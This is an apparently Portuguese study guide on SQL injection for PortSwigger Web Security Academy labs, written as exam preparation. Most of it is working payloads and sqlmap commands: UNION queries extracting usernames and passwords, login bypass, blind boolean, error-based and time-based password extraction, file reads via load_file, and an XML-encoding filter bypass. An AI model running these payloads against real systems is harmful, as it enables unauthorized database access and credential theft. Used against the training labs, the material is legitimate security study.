# SQL Injection

Probabilidade: $${\color{red}alta}$$.

Para o aprendizado, aprenda como explorar os laboratórios manualmente. É fundamental que você entenda como os ataques, os payloads e as queries funcionam no back-end.

Para o exame, aprenda como usar o SQLMap para resolver os laboratórios. O maior desafio do exame é o limite de tempo, e usar o SQLMap vai te poupar MUITO tempo.

Procure por Injection em funções óbvias como buscas, mas também em outros exemplos da PortSwigger como nos cookies.

> [!TIP]
> Às vezes copiar a request do Burp e colar em um arquivo .TXT não vai funcionar no SQLMap. Para resolver isso, você pode tanto salvar o arquivo clicando com o botão direito na request e em "Save Item" ou pegar a requisição pela tab Network do browser e selecionar "copy as cURL".

<br>

## Laboratórios

**SQL Injection with Filter bypass via XML encoding**

Descubra o Injection com:
```
<storeId>
    1 + 1
</storeId>
```

Utilize a extensão Hackvertor para encodar o payload em entidades:

Extensions --> Hackvertor --> Encode --> dec_entities ou hex_entities
```
<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>
```

Versão adaptada:
```
<@hex_entities>1 UNION all select load_file('/home/carlos/secret')<@/hex_entities>  

OU

<@hex_entities>1 UNION all select load_file('/home/carlos/secret') into outfile '/tmp/secret'<@/hex_entities>
```

<br>
<br>

**SQL Injection Vulnerability in WHERE Clause Allowing Retrieval of Hidden Data**

```
filter?category=Gifts' OR 1=1--
```

<br>
<br>

**SQL Injection Vulnerability Allowing Login Bypass**
```
administrator'--
```

<br>
<br>

**SQL Injection Attack, Listing the Database Contents on non-Oracle Databases**
```
sqlmap -u "https://0abb004b036cf05c8057b76900880048.web-security-academy.net/filter?category=Food+%26+Drink" <HEADERS COPIED BY CURL> -dbms postgresql --dbs
```

<br>
<br>

**SQL Injection Attack, Listing the Database Contents on Oracle**
```
sqlmap -u "https://0a5b000e03ac492e8091e99900e7000a.web-security-academy.net/filter?category=Pets" <HEADER COPIED BY CURL> --dbms Oracle --dbs
```

<br>
<br>

**SQL Injection UNION attack, Retrieving Data from Other Tables**
```
GET /filter?category=Gifts' UNION SELECT password,NULL from users--
```

<br>
<br>

**SQL Injection UNION Attack, Retrieving Multiple Values in a Single Column**
```
/filter?category=Gifts' UNION SELECT NULL,username || '~' || password
```

<br>
<br>

**Blind SQL Injection with Conditional Responses**
```
# Salve a request em um arquivo e coloque um asterisco no cookie vulnerável:
Cookie: TrackingId=*;

sqlmap -r request.txt
```

O comando acima vai utilizar injeção baseado em tempo e isso vai demorar bastante.

Para usar injeção condicional (utilize um cookie válido):
```
sqlmap -r request.txt --cookie="TrackingId=eZtIVdXggNeHUXsS" --string "Welcome" --technique B -p "TrackingId" --level 3 --dbs
```

<br>
<br>

**Blind SQL Injection with Conditional Errors**
```
# Error 500 significa que a query é verdadeira
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'

# Status 200 significa que a query é falsa
TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

<br>
<br>

**Visible Error-Based SQL Injection**
```
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

<br>
<br>

**Blind SQL Injection with Time Delays and Information Retrieval**
```
# Lembre de encodar o ponto e vírgula em URL

# Descobrindo o tamanho do password:
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>3)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--

# Utilizando o Intruder para dumpar a senha:
';SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,§1§,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--

# Utilizando Python:
';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,%s,1)='%s') THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users--
```

SQL Injection with Filter Bypass via XML encoding








